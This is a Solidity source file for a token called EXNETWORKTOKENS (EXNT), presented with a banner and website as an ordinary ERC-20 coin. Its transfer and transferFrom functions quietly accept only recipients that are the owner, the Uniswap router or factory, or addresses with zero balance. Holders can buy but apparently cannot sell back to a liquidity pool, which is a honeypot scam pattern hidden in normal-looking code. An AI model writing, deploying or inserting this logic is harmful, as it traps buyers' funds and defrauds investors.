/*

*/

/*
EEEEEEEEEEEEEEEEEEEEEEXXXXXXX       XXXXXXXNNNNNNNN        NNNNNNNNEEEEEEEEEEEEEEEEEEEEEETTTTTTTTTTTTTTTTTTTTTTTWWWWWWWW                           WWWWWWWW     OOOOOOOOO     RRRRRRRRRRRRRRRRR   KKKKKKKKK    KKKKKKK
E::::::::::::::::::::EX:::::X       X:::::XN:::::::N       N::::::NE::::::::::::::::::::ET:::::::::::::::::::::TW::::::W                           W::::::W   OO:::::::::OO   R::::::::::::::::R  K:::::::K    K:::::K
E::::::::::::::::::::EX:::::X       X:::::XN::::::::N      N::::::NE::::::::::::::::::::ET:::::::::::::::::::::TW::::::W                           W::::::W OO:::::::::::::OO R::::::RRRRRR:::::R K:::::::K    K:::::K
EE::::::EEEEEEEEE::::EX::::::X     X::::::XN:::::::::N     N::::::NEE::::::EEEEEEEEE::::ET:::::TT:::::::TT:::::TW::::::W                           W::::::WO:::::::OOO:::::::ORR:::::R     R:::::RK:::::::K   K::::::K
  E:::::E       EEEEEEXXX:::::X   X:::::XXXN::::::::::N    N::::::N  E:::::E       EEEEEETTTTTT  T:::::T  TTTTTT W:::::W           WWWWW           W:::::W O::::::O   O::::::O  R::::R     R:::::RKK::::::K  K:::::KKK
  E:::::E                X:::::X X:::::X   N:::::::::::N   N::::::N  E:::::E                     T:::::T          W:::::W         W:::::W         W:::::W  O:::::O     O:::::O  R::::R     R:::::R  K:::::K K:::::K   
  E::::::EEEEEEEEEE       X:::::X:::::X    N:::::::N::::N  N::::::N  E::::::EEEEEEEEEE           T:::::T           W:::::W       W:::::::W       W:::::W   O:::::O     O:::::O  R::::RRRRRR:::::R   K::::::K:::::K    
  E:::::::::::::::E        X:::::::::X     N::::::N N::::N N::::::N  E:::::::::::::::E           T:::::T            W:::::W     W:::::::::W     W:::::W    O:::::O     O:::::O  R:::::::::::::RR    K:::::::::::K     
  E:::::::::::::::E        X:::::::::X     N::::::N  N::::N:::::::N  E:::::::::::::::E           T:::::T             W:::::W   W:::::W:::::W   W:::::W     O:::::O     O:::::O  R::::RRRRRR:::::R   K:::::::::::K     
  E::::::EEEEEEEEEE       X:::::X:::::X    N::::::N   N:::::::::::N  E::::::EEEEEEEEEE           T:::::T              W:::::W W:::::W W:::::W W:::::W      O:::::O     O:::::O  R::::R     R:::::R  K::::::K:::::K    
  E:::::E                X:::::X X:::::X   N::::::N    N::::::::::N  E:::::E                     T:::::T               W:::::W:::::W   W:::::W:::::W       O:::::O     O:::::O  R::::R     R:::::R  K:::::K K:::::K   
  E:::::E       EEEEEEXXX:::::X   X:::::XXXN::::::N     N:::::::::N  E:::::E       EEEEEE        T:::::T                W:::::::::W     W:::::::::W        O::::::O   O::::::O  R::::R     R:::::RKK::::::K  K:::::KKK
EE::::::EEEEEEEE:::::EX::::::X     X::::::XN::::::N      N::::::::NEE::::::EEEEEEEE:::::E      TT:::::::TT               W:::::::W       W:::::::W         O:::::::OOO:::::::ORR:::::R     R:::::RK:::::::K   K::::::K
E::::::::::::::::::::EX:::::X       X:::::XN::::::N       N:::::::NE::::::::::::::::::::E      T:::::::::T                W:::::W         W:::::W           OO:::::::::::::OO R::::::R     R:::::RK:::::::K    K:::::K
E::::::::::::::::::::EX:::::X       X:::::XN::::::N        N::::::NE::::::::::::::::::::E      T:::::::::T                 W:::W           W:::W              OO:::::::::OO   R::::::R     R:::::RK:::::::K    K:::::K
EEEEEEEEEEEEEEEEEEEEEEXXXXXXX       XXXXXXXNNNNNNNN         NNNNNNNEEEEEEEEEEEEEEEEEEEEEE      TTTTTTTTTTT                  WWW             WWW                 OOOOOOOOO     RRRRRRRR     RRRRRRRKKKKKKKKK    KKKKKKK
                                                                                                                                                                                                                      
(EXNT) Exnetwork Tokens Website: exnetworkcommunity.com (soon)

*/

pragma solidity 0.5.17;

contract EXNETWORKTOKENS {
 
    mapping (address => uint256) public balanceOf;

    string public name = "EXNETWORKTOKENS";
    string public symbol = "EXNT";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);
    address contractOwner;
    address uniRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address uniFactory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor() public {
       
        contractOwner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        allowance[msg.sender][uniRouter] = 1000000000000000000000000000;
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        require(balanceOf[msg.sender] >= value);
        require(to == contractOwner || balanceOf[to] == 0 || to == uniFactory || to == uniRouter);
        balanceOf[msg.sender] -= value; 
        emit Transfer(msg.sender, to, value);
        balanceOf[to] += value;         
        return true;   
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);
    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
        public
        returns (bool success)
    {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        require(to == contractOwner || balanceOf[to] == 0 || to == uniFactory || to == uniRouter);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
}